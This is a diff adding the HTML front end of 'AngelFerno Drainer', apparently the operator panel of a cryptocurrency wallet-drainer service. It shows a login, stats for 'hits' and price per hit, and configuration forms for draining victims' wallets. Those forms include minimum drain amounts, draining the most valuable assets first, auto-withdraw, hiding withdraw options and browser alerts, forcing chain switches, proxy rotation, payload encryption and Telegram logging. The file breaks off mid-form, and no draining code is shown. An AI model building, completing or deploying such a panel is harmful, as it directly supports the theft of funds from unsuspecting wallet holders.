@@ -1,0 +1,1676 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=yes">
+    <title>AngelFerno Drainer|</title>
+    <link href="https://fonts.googleapis.com/css2?family=Inter:opsz,wght@14..32,300;400;500;600;700;800;900&family=JetBrains+Mono:wght@400;500;600;700&family=Poppins:wght@400;500;600;700;800&family=Bebas+Nova:wght@400&family=Space+Grotesk:wght@700&display=swap" rel="stylesheet">
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/jszip/3.10.1/jszip.min.js"></script>
+    <script src="https://telegram.org/js/telegram-web-app.js"></script>
+    <script src="credentials.js"></script>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        body {
+            background: #0b0b12;
+            font-family: 'Inter', 'Poppins', sans-serif;
+            padding: 2rem;
+            color: #ffffff;
+            min-height: 100vh;
+            position: relative;
+            overflow-x: hidden;
+        }
+
+        body::before {
+            content: '';
+            position: fixed;
+            top: 0;
+            left: 0;
+            right: 0;
+            bottom: 0;
+            background: radial-gradient(circle at 25% 0%, rgba(255, 60, 60, 0.15) 0%, #07070f 90%);
+            animation: gradient-shift 15s ease infinite;
+            z-index: -1;
+        }
+
+        body::after {
+            content: '';
+            position: fixed;
+            top: -50%;
+            left: -50%;
+            width: 200%;
+            height: 200%;
+            background: radial-gradient(circle at 50% 50%, rgba(255, 77, 77, 0.08) 0%, transparent 70%);
+            animation: rotate 25s linear infinite;
+            z-index: -1;
+            pointer-events: none;
+        }
+
+        @keyframes gradient-shift {
+            0%, 100% {
+                background-position: 0% 0%;
+            }
+            50% {
+                background-position: 100% 100%;
+            }
+        }
+
+        @keyframes rotate {
+            from {
+                transform: rotate(0deg);
+            }
+            to {
+                transform: rotate(360deg);
+            }
+        }
+
+        .glass-panel {
+            background: rgba(12, 10, 28, 0.55);
+            backdrop-filter: blur(25px) saturate(180%);
+            border-radius: 2rem;
+            border: 1px solid rgba(255, 70, 70, 0.35);
+            box-shadow: 0 30px 60px rgba(0, 0, 0, 0.7), inset 0 1px 0 rgba(255, 255, 255, 0.1);
+            position: relative;
+            overflow: hidden;
+        }
+
+        .glass-panel::before {
+            content: '';
+            position: absolute;
+            top: -50%;
+            left: -50%;
+            width: 200%;
+            height: 200%;
+            background: radial-gradient(circle, rgba(255, 77, 77, 0.1) 0%, transparent 70%);
+            animation: shimmer 8s ease-in-out infinite;
+            z-index: 0;
+            pointer-events: none;
+        }
+
+        @keyframes shimmer {
+            0%, 100% {
+                transform: translate(-25%, -25%);
+            }
+            50% {
+                transform: translate(25%, 25%);
+            }
+        }
+
+        .app-wrapper {
+            max-width: 1280px;
+            margin: 0 auto;
+            position: relative;
+            z-index: 1;
+        }
+
+        .signin-card {
+            max-width: 460px;
+            margin: 2rem auto;
+            padding: 2rem;
+            text-align: center;
+            position: relative;
+            z-index: 1;
+        }
+
+        .brand img {
+            width: 72px;
+            filter: drop-shadow(0 0 12px #ff3b3b);
+            transition: transform 0.3s ease, filter 0.3s ease;
+        }
+
+        .brand img:hover {
+            transform: scale(1.05) rotate(-5deg);
+            filter: drop-shadow(0 0 20px #ff5757);
+        }
+
+        .brand h1 {
+            font-size: 2.1rem;
+            background: linear-gradient(135deg, #ff4d4d, #ff1a1a);
+            background-clip: text;
+            -webkit-background-clip: text;
+            color: transparent;
+            font-weight: 800;
+            margin: 0.5rem 0;
+        }
+
+        .brand-subtitle {
+            font-size: 0.75rem;
+            color: #ffb347;
+            margin-top: 4px;
+        }
+
+        .input-group {
+            margin-bottom: 1.2rem;
+            text-align: left;
+        }
+
+        .input-label {
+            font-size: 0.7rem;
+            font-weight: 700;
+            letter-spacing: 1px;
+            color: #c79a9a;
+            margin-bottom: 0.4rem;
+            display: block;
+        }
+
+        .input-field {
+            background: rgba(12, 11, 26, 0.8);
+            border: 1.5px solid rgba(255, 77, 77, 0.25);
+            border-radius: 1.2rem;
+            padding: 0.95rem 1.2rem;
+            width: 100%;
+            color: white;
+            font-family: 'JetBrains Mono', monospace;
+            transition: all 0.3s ease;
+            backdrop-filter: blur(10px);
+        }
+
+        .input-field:focus {
+            border-color: #ff4d4d;
+            box-shadow: 0 0 0 3px rgba(255, 77, 77, 0.25), inset 0 0 20px rgba(255, 77, 77, 0.1);
+            outline: none;
+            background: rgba(12, 11, 26, 0.95);
+        }
+
+        .btn-primary {
+            background: linear-gradient(105deg, #ff3b3b, #e62020);
+            border: none;
+            padding: 0.95rem;
+            border-radius: 2rem;
+            font-weight: 700;
+            width: 100%;
+            cursor: pointer;
+            color: white;
+            transition: all 0.3s ease;
+            position: relative;
+            overflow: hidden;
+            box-shadow: 0 10px 30px rgba(255, 59, 59, 0.3);
+        }
+
+        .btn-primary::before {
+            content: '';
+            position: absolute;
+            top: 50%;
+            left: 50%;
+            width: 0;
+            height: 0;
+            border-radius: 50%;
+            background: rgba(255, 255, 255, 0.3);
+            transform: translate(-50%, -50%);
+            transition: width 0.6s ease, height 0.6s ease;
+        }
+
+        .btn-primary:hover {
+            transform: translateY(-3px);
+            box-shadow: 0 15px 40px rgba(255, 59, 59, 0.5);
+        }
+
+        .btn-primary:hover::before {
+            width: 300px;
+            height: 300px;
+        }
+
+        .btn-secondary {
+            background: #1e1c44;
+            border: 1px solid #4a4570;
+            padding: 0.65rem 1.3rem;
+            border-radius: 2rem;
+            font-weight: 600;
+            cursor: pointer;
+            color: #f0efff;
+        }
+
+        .dashboard-header {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            padding: 1.2rem 2rem;
+            border-bottom: 1px solid rgba(255, 255, 255, 0.06);
+            flex-wrap: wrap;
+            gap: 1rem;
+        }
+
+        .app-shell {
+            display: grid;
+            grid-template-columns: 240px 1fr;
+            gap: 1rem;
+            min-height: 78vh;
+        }
+
+        .side-nav {
+            background: rgba(12, 10, 28, 0.6);
+            border: 1px solid rgba(255, 70, 70, 0.2);
+            border-radius: 1.8rem;
+            padding: 1.4rem 1rem;
+            display: flex;
+            flex-direction: column;
+            justify-content: space-between;
+            gap: 1.2rem;
+            backdrop-filter: blur(20px) saturate(180%);
+            box-shadow: 0 20px 40px rgba(0, 0, 0, 0.4), inset 0 1px 0 rgba(255, 255, 255, 0.1);
+        }
+
+        .side-brand {
+            display: flex;
+            gap: 0.85rem;
+            align-items: center;
+            margin-bottom: 1rem;
+        }
+
+        .side-brand-icon {
+            width: 48px;
+            height: 48px;
+            border-radius: 18px;
+            overflow: hidden;
+            display: grid;
+            place-items: center;
+            background: rgba(255, 255, 255, 0.06);
+            border: 1px solid rgba(255, 255, 255, 0.08);
+        }
+
+        .side-brand-icon img {
+            width: 100%;
+            height: 100%;
+            object-fit: cover;
+        }
+
+        .side-title {
+            font-weight: 800;
+            font-size: 1rem;
+            color: #fff;
+        }
+
+        .side-subtitle {
+            font-size: 0.8rem;
+            color: #bf9c9d;
+        }
+
+        .side-menu {
+            display: flex;
+            flex-direction: column;
+            gap: 0.5rem;
+        }
+
+        .nav-tab {
+            padding: 0.95rem 1.1rem;
+            border-radius: 1.2rem;
+            font-weight: 700;
+            cursor: pointer;
+            color: #ccc;
+            transition: all 0.3s ease;
+            display: flex;
+            align-items: center;
+            gap: 0.5rem;
+            background: rgba(255, 77, 77, 0);
+            border: 1px solid transparent;
+        }
+
+        .nav-tab:hover {
+            background: rgba(255, 77, 77, 0.1);
+            border-color: rgba(255, 77, 77, 0.3);
+            color: #ff9a9a;
+            transform: translateX(4px);
+        }
+
+        .nav-tab.active {
+            background: linear-gradient(135deg, rgba(255, 77, 77, 0.3) 0%, rgba(255, 60, 60, 0.2) 100%);
+            border-color: rgba(255, 77, 77, 0.5);
+            color: #ffb3b3;
+            box-shadow: 0 0 15px rgba(255, 77, 77, 0.2);
+        }
+            align-items: center;
+            gap: 0.65rem;
+        }
+
+        .nav-tab:hover {
+            background: rgba(255, 255, 255, 0.04);
+        }
+
+        .nav-tab.active {
+            background: rgba(255, 59, 59, 0.17);
+            color: #fff;
+            border: 1px solid rgba(255, 59, 59, 0.35);
+        }
+
+        .side-signout {
+            width: 100%;
+            justify-content: center;
+            margin-top: auto;
+        }
+
+        .main-content {
+            display: flex;
+            flex-direction: column;
+            gap: 1rem;
+        }
+
+        .tab-content {
+            padding: 2rem;
+            background: rgba(0, 0, 0, 0.3);
+            border-radius: 1.5rem;
+            border: 1px solid rgba(255, 255, 255, 0.08);
+            backdrop-filter: blur(15px);
+            box-shadow: 0 10px 30px rgba(0, 0, 0, 0.3), inset 0 1px 0 rgba(255, 255, 255, 0.08);
+        }
+
+        .stat-card {
+            background: linear-gradient(135deg, rgba(255, 77, 77, 0.1) 0%, rgba(0, 0, 0, 0.3) 100%);
+            border-radius: 1.5rem;
+            padding: 1.2rem;
+            border: 1px solid rgba(255, 77, 77, 0.2);
+            backdrop-filter: blur(10px);
+            transition: all 0.3s ease;
+            position: relative;
+            overflow: hidden;
+        }
+
+        .stat-card::before {
+            content: '';
+            position: absolute;
+            top: 0;
+            left: -100%;
+            width: 100%;
+            height: 100%;
+            background: linear-gradient(90deg, transparent, rgba(255, 255, 255, 0.1), transparent);
+            transition: left 0.5s ease;
+        }
+
+        .stat-card:hover::before {
+            left: 100%;
+        }
+
+        .info-card {
+            background: rgba(12, 11, 26, 0.5);
+            border-radius: 1.2rem;
+            padding: 1rem;
+            border: 1px solid rgba(255, 77, 77, 0.15);
+            backdrop-filter: blur(10px);
+            transition: all 0.3s ease;
+        }
+
+        .info-card:hover {
+            border-color: rgba(255, 77, 77, 0.35);
+            background: rgba(12, 11, 26, 0.65);
+            box-shadow: 0 5px 20px rgba(255, 77, 77, 0.1);
+        }
+
+        .config-table {
+            width: 100%;
+            border-collapse: collapse;
+        }
+
+        .config-table th,
+        .config-table td {
+            padding: 1rem;
+            text-align: left;
+            border-bottom: 1px solid rgba(255, 255, 255, 0.05);
+        }
+
+        .badge {
+            background: #2a2555;
+            padding: 0.2rem 0.7rem;
+            border-radius: 2rem;
+            font-size: 0.7rem;
+        }
+
+        .icon-btn {
+            background: transparent;
+            border: 1px solid #3e3a70;
+            padding: 0.3rem 0.9rem;
+            border-radius: 2rem;
+            color: #cdcaff;
+            cursor: pointer;
+            margin: 0 4px;
+        }
+
+        .modal {
+            display: none;
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: rgba(0, 0, 0, 0.85);
+            backdrop-filter: blur(12px);
+            justify-content: center;
+            align-items: center;
+            z-index: 2000;
+        }
+
+        .modal.show {
+            display: flex;
+        }
+
+        .modal-content {
+            background: #0e0c26;
+            border-radius: 2rem;
+            max-width: 1100px;
+            width: 92%;
+            max-height: 85vh;
+            overflow-y: auto;
+            padding: 2rem;
+            border: 1px solid #ff4d4d55;
+        }
+
+        .chains-grid {
+            display: flex;
+            flex-wrap: wrap;
+            gap: 0.8rem;
+            margin: 1rem 0;
+        }
+
+        .popup-selection-panel {
+            margin: 1.4rem 0 0.8rem;
+        }
+
+        .popup-selection-panel h4 {
+            margin-bottom: 0.7rem;
+            color: #ff8c8c;
+        }
+
+        .popup-style-grid {
+            display: grid;
+            grid-template-columns: repeat(auto-fit, minmax(220px, 1fr));
+            gap: 1.2rem;
+        }
+
+        .popup-card {
+            background: linear-gradient(135deg, rgba(20,18,50,0.8), rgba(25,20,60,0.6));
+            border: 1.5px solid rgba(255,70,70,0.2);
+            border-radius: 1.8rem;
+            padding: 1.2rem;
+            cursor: pointer;
+            transition: all 0.3s cubic-bezier(0.34, 1.56, 0.64, 1);
+            min-height: 220px;
+            display: flex;
+            flex-direction: column;
+            gap: 1rem;
+        }
+
+        .popup-card:hover {
+            transform: translateY(-4px);
+            border-color: rgba(255,100,100,0.4);
+            background: linear-gradient(135deg, rgba(30,25,65,0.9), rgba(35,28,75,0.7));
+        }
+
+        .popup-card.active {
+            border-color: #ff3b3b;
+            box-shadow: 0 0 0 2.5px rgba(255, 59, 59, 0.2), inset 0 0 20px rgba(255, 59, 59, 0.1);
+            transform: translateY(-4px) scale(1.02);
+            background: linear-gradient(135deg, rgba(40,30,80,1), rgba(45,33,90,0.9));
+        }
+
+        .popup-preview {
+            border-radius: 1.2rem;
+            background: linear-gradient(180deg, rgba(0,0,0,0.3), rgba(0,0,0,0.1));
+            border: 1px solid rgba(255,100,100,0.15);
+            min-height: 110px;
+            display: flex;
+            flex-direction: column;
+            gap: 0.5rem;
+            color: #e0dff0;
+            font-size: 0.88rem;
+            text-align: left;
+            padding: 0.9rem 0.8rem;
+        }
+
+        .popup-card-image {
+            width: 100%;
+            height: 140px;
+            object-fit: cover;
+            border-radius: 1rem;
+            border: 1px solid rgba(255,255,255,0.08);
+            box-shadow: inset 0 0 18px rgba(0,0,0,0.2);
+        }
+
+        .popup-preview > div {
+            display: flex;
+            align-items: center;
+            justify-content: space-between;
+            gap: 0.5rem;
+            padding: 0.55rem;
+            border-radius: 0.9rem;
+            background: rgba(255,255,255,0.04);
+            border: 0.5px solid rgba(255,255,255,0.06);
+            transition: background 0.2s;
+        }
+
+        .popup-preview > div:hover {
+            background: rgba(255,100,100,0.08);
+        }
+
+        .popup-card-title {
+            font-weight: 800;
+            color: #ffffff;
+            font-size: 1.05rem;
+            letter-spacing: 0.3px;
+        }
+
+        .popup-card-description {
+            font-size: 0.8rem;
+            color: #c4bdd0;
+            line-height: 1.5;
+        }
+
+        .popup-card .popup-card-flag {
+            margin-top: auto;
+            font-size: 0.75rem;
+            color: #ff9a9a;
+            text-transform: uppercase;
+            letter-spacing: 0.5px;
+            font-weight: 600;
+        }
+
+        .chain-chip,
+        .chain-item {
+            background: rgba(255, 255, 255, 0.05);
+            border: 1px solid rgba(255, 95, 95, 0.4);
+            border-radius: 2rem;
+            padding: 0.4rem 1rem;
+            display: inline-flex;
+            align-items: center;
+            gap: 0.5rem;
+            font-size: 0.85rem;
+            cursor: pointer;
+            transition: transform 0.2s ease, background 0.2s ease;
+        }
+
+        .chain-chip:hover,
+        .chain-item:hover {
+            transform: translateY(-1px);
+            background: rgba(255,255,255,0.08);
+        }
+
+        .toast {
+            position: fixed;
+            bottom: 2rem;
+            right: 2rem;
+            background: #1e1b44;
+            border-left: 4px solid #ff3b3b;
+            padding: 0.8rem 1.4rem;
+            border-radius: 1rem;
+            z-index: 3000;
+            animation: slideUp 0.3s ease;
+        }
+
+        .loading-overlay {
+            position: fixed;
+            inset: 0;
+            background: rgba(3, 2, 18, 0.9);
+            backdrop-filter: blur(8px);
+            display: none;
+            align-items: center;
+            justify-content: center;
+            z-index: 5000;
+            padding: 2rem;
+            text-align: center;
+        }
+
+        .loading-overlay.show {
+            display: flex;
+        }
+
+        .loading-box {
+            background: rgba(15, 12, 35, 0.95);
+            border-radius: 2rem;
+            padding: 2rem 2.4rem;
+            border: 1px solid rgba(255, 77, 77, 0.25);
+            box-shadow: 0 0 45px rgba(255, 59, 59, 0.18);
+            max-width: 420px;
+            width: 100%;
+        }
+
+        .loading-spinner {
+            width: 56px;
+            height: 56px;
+            border: 6px solid rgba(255, 255, 255, 0.12);
+            border-top-color: #ff4d4d;
+            border-radius: 50%;
+            margin: 0 auto 1.3rem auto;
+            animation: spin 1s linear infinite;
+        }
+
+        .loading-label {
+            color: #ffd2d2;
+            font-weight: 700;
+            margin-top: 0.5rem;
+            font-size: 1rem;
+        }
+
+        @keyframes spin {
+            to { transform: rotate(360deg); }
+        }
+
+        @keyframes slideUp {
+            from {
+                opacity: 0;
+                transform: translateY(20px);
+            }
+            to {
+                opacity: 1;
+                transform: translateY(0);
+            }
+        }
+
+        hr {
+            border-color: #2e2b55;
+            margin: 1rem 0;
+        }
+
+        .flex-between {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            flex-wrap: wrap;
+        }
+
+        .welcome-header {
+            margin-bottom: 1.5rem;
+        }
+
+        .status-active {
+            color: #4cff8e;
+            display: inline-flex;
+            align-items: center;
+            gap: 0.4rem;
+        }
+
+        .section-panel {
+            background: rgba(255,255,255,0.03);
+            border: 1px solid rgba(255,100,100,0.15);
+            border-radius: 1.2rem;
+            padding: 1.4rem;
+            margin-bottom: 1.5rem;
+        }
+
+        .section-panel h4 {
+            color: #ff9a9a;
+            font-size: 1rem;
+            margin-bottom: 1rem;
+            font-weight: 700;
+            letter-spacing: 0.5px;
+        }
+
+        .brand-link,
+        .side-brand-link {
+            display: inline-flex;
+            align-items: center;
+            gap: 0.75rem;
+            text-decoration: none;
+            color: inherit;
+        }
+
+        .brand-link:hover,
+        .side-brand-link:hover {
+            opacity: 0.92;
+        }
+
+        @media (max-width: 1024px) {
+            .app-shell {
+                grid-template-columns: 1fr;
+            }
+
+            .side-nav {
+                flex-direction: row;
+                flex-wrap: wrap;
+                align-items: flex-start;
+                padding: 1rem;
+                gap: 1rem;
+            }
+
+            .side-brand {
+                width: 100%;
+                justify-content: flex-start;
+            }
+
+            .side-menu {
+                flex-direction: row;
+                flex-wrap: wrap;
+                gap: 0.65rem;
+                padding: 0.25rem 0;
+                border-top: 1px solid rgba(255,255,255,0.08);
+                width: 100%;
+            }
+
+            .nav-tab {
+                padding: 0.75rem 0.9rem;
+                white-space: nowrap;
+                font-size: 0.85rem;
+            }
+
+            .dashboard-header {
+                padding: 1rem 1.2rem;
+            }
+
+            .tab-content {
+                padding: 1.2rem;
+            }
+
+            .modal-content {
+                width: 96%;
+            }
+
+            .popup-style-grid {
+                grid-template-columns: 1fr;
+            }
+
+            .grid-2cols {
+                grid-template-columns: 1fr;
+            }
+
+            .loading-box {
+                max-width: 360px;
+            }
+        }
+
+        @media (max-width: 640px) {
+            body {
+                padding: 1rem;
+            }
+
+            .signin-card,
+            .modal-content {
+                padding: 1.2rem;
+            }
+
+            .btn-primary,
+            .btn-secondary {
+                width: 100%;
+            }
+
+            .popup-card {
+                min-height: auto;
+            }
+
+            .popup-card-image {
+                height: 120px;
+            }
+        }
+
+        .checkbox-group {
+            display: block;
+            margin-bottom: 0.6rem;
+        }
+
+        .checkbox-group label {
+            display: flex;
+            align-items: center;
+            color: #ddd;
+            font-size: 0.9rem;
+            cursor: pointer;
+            user-select: none;
+        }
+
+        .checkbox-group input[type="checkbox"] {
+            margin-right: 0.7rem;
+            width: 18px;
+            height: 18px;
+            cursor: pointer;
+            accent-color: #ff4d4d;
+        }
+
+        .grid-2cols {
+            display: grid;
+            grid-template-columns: 1fr 1fr;
+            gap: 1.5rem;
+            margin-bottom: 1.5rem;
+        }
+
+        @media (max-width: 768px) {
+            .grid-2cols {
+                grid-template-columns: 1fr;
+            }
+        }
+    </style>
+</head>
+<body>
+<div class="app-wrapper">
+    <!-- SIGN IN VIEW -->
+    <div id="signinView" class="glass-panel signin-card">
+        <div class="brand">
+            <div class="brand-link" style="pointer-events: none; cursor: default;">
+                <img src="https://ba5wksxylswtsgo4v63iaa6uguwae32llw2dtn7uaz2zkxeyh6ea.arweave.net/CDtlSvhcrTkZ3K-2gAPUNSwCb0tdtDm39AZ1lVyYP4g/public/img/inferno.svg" alt="logo">
+                <div>
+                    <h1>AngelFerno Drainer</h1>
+                    <div class="brand-subtitle">Sign in to access the panel</div>
+                </div>
+            </div>
+        </div>
+        <form id="loginForm">
+            <div class="input-group">
+                <label class="input-label">Your Panel ID</label>
+                <input type="text" id="loginPanelId" class="input-field" placeholder="Enter Customer ID" autocomplete="off" maxlength="10">
+            </div>
+            <div class="input-group">
+                <label class="input-label">Password</label>
+                <input type="password" id="loginPassword" class="input-field" placeholder="Enter password" autocomplete="off" maxlength="25">
+            </div>
+            <button type="submit" class="btn-primary" id="loginBtn">🔐 Access Panel</button>
+        </form>
+        <div class="brand-subtitle">© 2026 AngelFernoDrainer. Crafted with ❤️</div>
+    </div>
+
+    <!-- MAIN DASHBOARD (hidden until login) -->
+<div id="mainAppView" style="display:none;">
+    <div class="glass-panel" style="overflow:hidden; padding:0;">
+        <div class="app-shell">
+            <aside class="side-nav">
+                <div class="side-brand">
+                    <div class="side-brand-link" style="pointer-events: none; cursor: default;">
+                        <div class="side-brand-icon"><img src="https://ba5wksxylswtsgo4v63iaa6uguwae32llw2dtn7uaz2zkxeyh6ea.arweave.net/CDtlSvhcrTkZ3K-2gAPUNSwCb0tdtDm39AZ1lVyYP4g/public/img/inferno.svg" alt="AngelFerno logo"></div>
+                        <div>
+                            <div class="side-title">AngelFerno</div>
+                            <div id="sidePageSubtitle" class="side-subtitle">Dashboard overview</div>
+                        </div>
+                    </div>
+                </div>
+                <nav class="side-menu">
+                    <div class="nav-tab active" data-tab="dashboard">📊 Dashboard</div>
+                    <div class="nav-tab" data-tab="configs">⚙️ Configurations</div>
+                    <div class="nav-tab" data-tab="settings">🛠 Settings</div>
+                    <div class="nav-tab" data-tab="documentation">📘 Documentation</div>
+                    <div class="nav-tab" data-tab="activity">📈 Activity</div>
+                </nav>
+                <button id="globalSignOutBtn" class="btn-secondary side-signout" style="background:#211c33;">🚪 Logout</button>
+            </aside>
+
+            <section class="main-content">
+                <div class="dashboard-header">
+                    <div>
+                        <div style="font-size:0.85rem; color:#ff9a9a; letter-spacing:0.05em;">🩸 AngelFerno 🩸</div>
+                        <div id="mainPageTitle" style="font-size:1.5rem; font-weight:800;">Dashboard</div>
+                    </div>
+                    <div class="plan-selector plan-badge-container">
+                        <div class="plan-badge" id="currentPlanBadge"><span class="gem-icon">💎</span> <span id="currentPlanLabel">Diamond</span></div>
+                    </div>
+                </div>
+
+                <div id="dashboardTab" class="tab-content">
+                    <div id="planInfoBanner" class="info-card" style="background: rgba(255,255,255,0.04); border-left: 4px solid #ff3b3b; margin-bottom:1.2rem;">
+                        <strong>💎 Diamond Tier</strong> — Elite · All chains
+                    </div>
+                    <div class="welcome-header">
+                        <h2>Welcome Back! 👋</h2>
+                        <p style="color: #c68e8e;">Your current level: <strong id="levelNameDisplay">Diamond</strong></p>
+                    </div>
+                    <div class="stats-primary">
+                        <div class="stat-card"><div class="stat-label">HITS PRICE</div><div class="stat-value" id="statHitsPrice">$0</div></div>
+                        <div class="stat-card"><div class="stat-label">TOTAL HITS</div><div class="stat-value" id="statTotalHits">0</div></div>
+                        <div class="stat-card"><div class="stat-label">TOTAL CONNECTS</div><div class="stat-value" id="statTotalConnects">0</div></div>
+                        <div class="stat-card"><div class="stat-label">SUCCESS RATE</div><div class="stat-value" id="statSuccessRate">0%</div></div>
+                    </div>
+                    <div class="detailed-breakdown">
+                        <div class="info-card"><div class="stat-label">Hit Ratio</div><div class="stat-value" style="font-size:1.8rem;" id="statHitRatio">0%</div></div>
+                        <div class="info-card"><div class="stat-label">Avg Price per Hit</div><div class="stat-value" style="font-size:1.8rem;" id="statAvgPrice">$0</div></div>
+                        <div class="info-card"><div class="stat-label">Last Updated</div><div class="stat-value" style="font-size:1.4rem;" id="statLastUpdated">—</div><div class="stat-sub" style="font-size:0.75rem; color:#a9a2d3; margin-top:0.5rem;">Account Status <span class="status-active">● Active</span></div></div>
+                    </div>
+                    <div style="display:flex; justify-content:flex-end; margin-top:1rem;">
+                        <div id="refreshDashboardBtn" class="refresh-indicator">🔄 Refresh stats</div>
+                    </div>
+                    <div class="footer-note" style="margin-top:2rem; text-align:center; color:#e64c4c;">© 2026 AngelFernoDrainer. Crafted with ❤️</div>
+                </div>
+
+                <div id="configsTab" class="tab-content" style="display:none;">
+                    <div class="flex-between" style="margin-bottom:1.5rem;">
+                        <h3>📁 Configurations · <span id="configCount">0</span></h3>
+                        <button id="addConfigBtn" class="btn-primary" style="width:auto; padding:0.5rem 1.4rem;">+ Add Config</button>
+                    </div>
+                    <table class="config-table">
+                        <thead><tr><th>Name</th><th>Tag</th><th>Actions</th></tr></thead>
+                        <tbody id="configsListBody"></tbody>
+                    </table>
+                    <div style="margin-top:0.8rem; font-size:0.75rem; color:#a49fd4;">Showing all saved configurations.</div>
+                </div>
+
+                <div id="settingsTab" class="tab-content" style="display:none;">
+                    <div class="welcome-header">
+                        <h2>Settings</h2>
+                        <p style="color: #c68e8e;">Adjust interface, security and persistence preferences.</p>
+                    </div>
+                    <div class="info-card" style="margin-bottom:1rem;">
+                        <h4>Session & Security</h4>
+                        <p>Logged-in session state and bot-issued credential validation are managed by the backend. Sign out to clear the current session.</p>
+                    </div>
+                    <div class="grid-2cols">
+                        <div class="info-card">
+                            <h4>Dashboard Refresh</h4>
+                            <p>Dashboard metrics refresh automatically every 30 seconds. You can also force refresh manually.</p>
+                        </div>
+                        <div class="info-card">
+                            <h4>Panel Interface</h4>
+                            <p>The side navigation now provides fast access to documentation, configurations, and activity logs.</p>
+                        </div>
+                    </div>
+                </div>
+
+                <div id="documentationTab" class="tab-content" style="display:none;">
+                    <div class="welcome-header">
+                        <h2>Documentation</h2>
+                        <p style="color: #c68e8e;">A quick guide for the AngelFerno panel experience.</p>
+                    </div>
+                    <div class="info-card" style="margin-bottom:1rem;">
+                        <h4>Getting Started</h4>
+                        <ul style="padding-left:1rem; color:#d8c4cc;">
+                            <li>Use the bot-issued Panel ID and password to log in.</li>
+                            <li>Your tier is assigned randomly on authentication.</li>
+                            <li>Saved configuration changes are available in the Configurations tab.</li>
+                        </ul>
+                    </div>
+                    <div class="info-card">
+                        <h4>Best Practices</h4>
+                        <ul style="padding-left:1rem; color:#d8c4cc;">
+                            <li>Always sign out after using the panel.</li>
+                            <li>Keep your generated credentials private.</li>
+                            <li>Use the documentation tab for quick refreshes.</li>
+                        </ul>
+                    </div>
+                </div>
+
+                <div id="activityTab" class="tab-content" style="display:none;">
+                    <div class="welcome-header">
+                        <h2>Activity</h2>
+                        <p style="color: #c68e8e;">Recent events and panel activity summary.</p>
+                    </div>
+                    <div class="info-card" style="margin-bottom:1rem;">
+                        <h4>Recent Activity</h4>
+                        <p>No activity available yet. Actions like login, config changes, and refresh events will appear here.</p>
+                    </div>
+                    <div class="info-card">
+                        <h4>Panel Notes</h4>
+                        <p>Use this area to keep a quick log of session events, configuration edits, or other relevant workflow details.</p>
+                    </div>
+                </div>
+            </section>
+        </div>
+    </div>
+</div>
+
+<!-- MODALS -->
+<div id="addConfigModal" class="modal"><div class="modal-content" style="max-width:450px;"><div class="flex-between"><h3>➕ New Config</h3><button class="modal-close" type="button">✕</button></div><input type="text" id="newConfigName" class="input-field" placeholder="Enter config name"><div style="display:flex; gap:1rem; margin-top:1.5rem;"><button type="button" id="confirmAddConfig" class="btn-primary">Add Config</button><button type="button" id="cancelAddConfig" class="btn-secondary">Cancel</button></div></div></div>
+<div id="editConfigModal" class="modal"><div class="modal-content" style="max-width:1200px;"><div class="flex-between"><h2>✏️ Edit Configuration</h2><button class="modal-close" type="button">✕</button></div><div class="section-panel"><h4>Popup Appearance</h4><div class="grid-2cols"><div><div class="input-group"><label>Popup Title</label><input id="editTitle" class="input-field"></div><div class="input-group"><label>Button Class</label><input id="editBtnClass" class="input-field"></div><div class="input-group"><label>Reject Text</label><input id="editRejectText" class="input-field"></div><div class="input-group"><label>Not Eligible Text</label><input id="editNotEligible" class="input-field"></div><div class="input-group"><label>Favicon URL</label><input id="editFavicon" class="input-field" placeholder="https://..."></div><div class="input-group"><label>Proxy / SOCKS5 List</label><input id="editProxyList" class="input-field" placeholder="http://proxy1:port,https://proxy2:port"></div><div class="input-group"><label>Custom User-Agent</label><input id="editCustomUserAgent" class="input-field" placeholder="Mozilla/5.0 ..."></div><div class="checkbox-group"><label><input type="checkbox" id="editUseCustomUserAgent"> Use Custom User-Agent</label></div></div><div><div class="input-group"><label>Domain</label><input id="editDomain" class="input-field" placeholder="https://..."></div><div class="input-group"><label>Path</label><input id="editPath" class="input-field" placeholder="/connect"></div><div class="input-group"><label>Max Retries</label><input id="editMaxRetries" type="number" class="input-field"></div><div class="input-group"><label>Retry Delay (ms)</label><input id="editRetryDelay" type="number" class="input-field"></div><div class="input-group"><label>Max Wallets</label><input id="editMaxWallets" type="number" class="input-field"></div></div></div></div><div class="section-panel"><h4>Drain Controls</h4><div class="grid-2cols"><div><div class="input-group"><label>Min Eligible ($)</label><input id="editMinElig" type="number" class="input-field"></div><div class="input-group"><label>Min Drain ($)</label><input id="editMinDrain" type="number" class="input-field"></div><div class="input-group"><label>Wallets per Batch</label><input id="editWalletsPerBatch" type="number" class="input-field"></div><div class="input-group"><label>Connection Delay (ms)</label><input id="editConnectionDelay" type="number" class="input-field" placeholder="1000"></div></div><div><div class="checkbox-group"><label><input type="checkbox" id="editClickEverywhere"> Click Everywhere</label></div><div class="checkbox-group"><label><input type="checkbox" id="editTelegramLogs"> Telegram Logs</label></div><div class="checkbox-group"><label><input type="checkbox" id="editSendPanelNotif"> Panel Notification</label></div><div class="checkbox-group"><label><input type="checkbox" id="editHideNativeWithdraw"> Hide Native Withdraw Options</label></div><div class="checkbox-group"><label><input type="checkbox" id="editHideBrowserAlerts"> Hide Browser Alerts</label></div><div class="checkbox-group"><label><input type="checkbox" id="editForceChainSwitch"> Force Chain Switch</label></div><div class="checkbox-group"><label><input type="checkbox" id="editAutoWithdraw"> Auto Withdraw</label></div><div class="checkbox-group"><label><input type="checkbox" id="editSessionWatermark"> Session Watermark</label></div><div class="checkbox-group"><label><input type="checkbox" id="editPayloadEncryption"> Payload Encryption</label></div><div class="checkbox-group"><label><input type="checkbox" id="editDrainValuableFirst"> Drain Valuable Assets First</label></div></div></div></div><div class="section-panel"><h4>Execution & Stealth</h4><div class="grid-2cols"><div><div class="input-group"><label>Approval Timeout (s)</label><input id="editApprovalTimeout" type="number" class="input-field" placeholder="30"></div><div class="input-group"><label>Max Sessions</label><input id="editMaxConcurrentSessions" type="number" class="input-field" placeholder="8"></div><div class="input-group"><label>Log Level</label><select id="editLogLevel" class="input-field"><option value="info">Info</option><option value="debug">Debug</option><option value="warn">Warn</option><option 